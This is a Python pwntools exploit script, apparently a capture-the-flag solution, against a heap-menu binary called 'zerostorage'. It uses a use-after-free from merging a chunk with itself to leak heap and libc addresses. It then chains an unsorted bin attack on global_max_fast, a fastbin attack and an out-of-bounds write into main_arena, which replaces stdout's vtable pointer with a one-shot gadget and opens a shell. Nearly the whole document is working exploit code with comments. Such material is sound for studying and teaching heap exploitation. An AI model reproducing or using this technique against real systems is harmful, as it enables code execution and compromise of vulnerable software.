from pwn import *

def alloc(size, data):
	r.sendlineafter('choice: ', '1')
	r.sendlineafter('entry: ', str(size))
	r.sendafter('data: ', data.ljust(size, 'X'))
	return

def update(idx, size, data):
	r.sendlineafter('choice: ', '2')
	r.sendlineafter('ID: ', str(idx))
	r.sendlineafter('entry: ', str(size))
	r.sendafter('data: ', data.ljust(size, chr(0)))
	return

def merge(idx_1, idx_2):
	r.sendlineafter('choice: ', '3')
	r.sendlineafter('ID: ', str(idx_1))
	r.sendlineafter('ID: ', str(idx_2))
	return

def free(idx):
	r.sendlineafter('choice: ', '4')
	r.sendlineafter('ID: ', str(idx))
	return

def view(idx):
	r.sendlineafter('choice: ', '5')
	r.sendlineafter('ID: ', str(idx))
	return

def leak(idx):
	view(idx)
	r.recvuntil('Entry No.0:\n')
	return (u64(r.recv(6).ljust(8, chr(0))), r.recv(2), u64(r.recv(6).ljust(8, chr(0))))

def pwn():

	for _ in xrange(16):
		alloc(0x40, 'A'*0x8)

	alloc(0x2f0, 'victim'.ljust(8, chr(0)) + p64(0x31)*31) #16 -- victim chunk
	for _ in xrange(3):
		alloc(0x800, 'B'*0x8)

	# The |merge| function doesn't check if we choose to merge a chunk with itself which leads to a UAF
	# free entry #0 => UAF => free'd chunk at entry #20
	merge(0, 0)
	# free entry #2 => UAF => free'd chunk at entry #0
	merge(2, 2)

	heap, _, libc = leak(0)
	# fake_chunk is a heap area close to the victim's address (entry #16) whose metadata will be set up
	# in such way that we can overwrite a fastbin's FD with its address, land it back to us and be able to overwrite
	# the victim's size in order to perform a main_arena OOB write once we've done unsorted bin attack on global_max_fast
	fake_chunk = heap + 0x8d0
	libc -= 0x3c4b78
	oneshot = libc + 0xf1147
	global_max_fast = libc + 0x3c67f8
	log.success('Libc: 0x{:x}'.format(libc))
	log.success('Heap: 0x{:x}'.format(heap))

	# chunk #20 is pressumably free, but thanks to the UAF we can still write to it
	update(20, 0x80, p64(0xb00bface) + p64(global_max_fast - 0x10))

	# global_max_fast unsorted bin attack
	alloc(0x80, 'kek') #20

	# chunk #15 will be free'd and will be placed back in entry #21
	merge(15, 15) #21

	# fastbin attack
	update(21, 0x80, p64(fake_chunk) + p64(0)*10 + p64(0x91))

	alloc(0x80, p64(0x1337)*11 + p64(0x91)) #15
	# check free(16) below for why we need to do this
	update(19, 0x800, p64(0x31) * (0x800/8))
	# new chunk #22 will overlap chunk #16
	# 0x17c1 is the size which will trigger the main_arena OOB
	# and overwrite stdout's vtable pointer
	alloc(0x80, p64(0xdeadbeef)*4 + p64(0) + p64(0x17c1) + p64(0xcafebabe)*5 + p64(oneshot)) #22
	
	# main_arena OOB write => overwrite stdout's vtable with chunk #16
	# ___printf_chk will get called once we delete a chunk, which will invoke
	#  _IO_sputn which is at [vtable + 0x38], where we placed one shot gadget's address
	# we call update(19, 0x800, p64(0x31) * (0x800/8)) in order to spray the heap with 
	# valid chunk_at_offset (chunk_16, 0x17c1) sizes to keep _int_free from complaining
	# See https://github.com/str8outtaheap/heapwn/blob/master/malloc/malloc-2.23.c#L3896
	free(16)

	r.interactive()

if __name__ == "__main__":
	r = process('./zerostorage')
	pause()
	pwn()
